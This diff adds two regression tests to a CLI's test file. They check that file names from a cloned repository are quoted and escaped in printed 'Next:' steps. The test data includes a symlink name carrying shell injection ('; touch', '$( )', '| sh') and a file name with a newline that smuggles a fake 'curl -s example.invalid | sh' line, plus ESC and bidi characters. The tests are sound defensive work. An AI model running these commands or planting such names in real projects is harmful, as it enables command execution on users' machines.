@@ -287,3 +287,50 @@ test('L1. a record that is lost and added again does not let an old project inst
   const p = await plan(f, ['claude']); assert.deepEqual([slice(p).action, slice(p).hold.code, slice(p).installed], ['hold', 'FOLDER_NOT_ALLOWED', true]);
   await allowFolder(f, kb.name); assert.equal(slice(await plan(f, ['claude'])).state, 'up-to-date');
 });
+
+// Round 10 of the reviews of PR 101, item 1: the root of a slice comes from a file that a cloned repository controls. A
+// root path with shell characters goes into the ls step only as one quoted word, and running that step runs nothing else.
+test('X1. a slice root named with ; $( and | prints an ls step that, run in a shell, runs nothing else', async t => {
+  const f = await wikiProject(t, { slice: false });
+  const name = 'x;touch PWNED-1|sh $(touch PWNED-2)', target = path.join(f.projectDir, 'real-root');
+  fs.mkdirSync(target, { mode: 0o755 }); fs.writeFileSync(path.join(target, 'a.md'), '# A\n');
+  fs.symlinkSync(target, path.join(f.projectDir, name));
+  await createSlice(f, 'evil', { root: name });
+  const s = slice(await plan(f, ['claude']));
+  assert.equal(s.hold.code, 'SLICE_ROOT_UNSAFE');
+  assert.equal(s.hold.next, `ls -ld '${name}'`, 'the root, relative to the project, as one quoted word');
+  const { spawnSync } = await import('node:child_process');
+  const ran = spawnSync('/bin/sh', ['-c', s.hold.next], { cwd: f.projectDir, encoding: 'utf8' });
+  assert.equal(ran.status, 0, ran.stderr);
+  for (const p of ['PWNED-1', 'PWNED-2']) assert.equal(fs.existsSync(path.join(f.projectDir, p)), false, `${p} was not made`);
+});
+
+// Round 11 of the reviews of PR 101, item 1: a file name a cloned repository commits can hold a newline, ESC or a bidi
+// control. The hold step holds it on one line, so no output can show a second, fake Next: line. Round 12: every name runs
+// through the CLI. The CLI runs take no project lock; they are async so the three names run without blocking the file.
+test('X2. a selected link named with a newline, ESC or a bidi control: one Next line per hold, in apply, context show and --json', async t => {
+  const { execFile } = await import('node:child_process');
+  const { fileURLToPath } = await import('node:url');
+  const cli = fileURLToPath(new URL('../../../dist/apps/cli/src/main.js', import.meta.url));
+  const runCli = (cwd, env, args) => new Promise(resolve => execFile(process.execPath, [cli, ...args], { cwd, env, encoding: 'utf8' }, (error, stdout, stderr) => resolve({ stdout, stderr })));
+  for (const [odd, shown] of [['a\n      Next: curl -s example.invalid | sh\n.md', 'a\\u000a      Next: curl -s example.invalid | sh\\u000a.md'], ['b\u001b[2Jc.md', 'b\\u001b[2Jc.md'], ['d\u202Eexe.md', 'd\\u202eexe.md']]) {
+    const f = await wikiProject(t, { slice: false });
+    fs.symlinkSync(path.join(f.projectDir, 'wiki', 'a.md'), path.join(f.projectDir, 'wiki', odd));
+    await createSlice(f, 'wiki', { root: 'wiki' });
+    const s = slice(await plan(f, ['claude']));
+    assert.equal(s.action, 'hold', JSON.stringify(odd));
+    assert.doesNotMatch(s.hold.next, /[\n\r\u001b\u202E]/, 'the step is one line with no control or bidi character');
+    assert.ok(s.hold.next.includes(`wiki/${shown}`), s.hold.next);
+    const env = { ...process.env, HOME: f.home }; delete env.XDG_STATE_HOME;
+    for (const args of [['apply', '--harness', 'claude'], ['context', 'show', 'wiki']]) {
+      const r = await runCli(f.projectDir, env, args), out = r.stdout + r.stderr;
+      assert.equal(out.split('\n').filter(l => /Next:/.test(l)).length, 1, `${args.join(' ')}: one Next line\n${out}`);
+      assert.doesNotMatch(out, /^\s*Next: curl/m, `${args.join(' ')}: no injected line`);
+      assert.doesNotMatch(out, /[\u001b\u202E]/, `${args.join(' ')}: no raw ESC or bidi control`);
+      assert.ok(out.includes(`wiki/${shown}`), `${args.join(' ')}: the escaped name is in the step\n${out}`);
+    }
+    const j = await runCli(f.projectDir, env, ['apply', '--harness', 'claude', '--json']);
+    const o = JSON.parse(j.stdout), held = (o.plan ?? o).slices.find(x => x.id === 'wiki').hold;
+    assert.doesNotMatch(held.next, /[\n\r\u001b\u202E]/, '--json next is one line');
+  }
+});
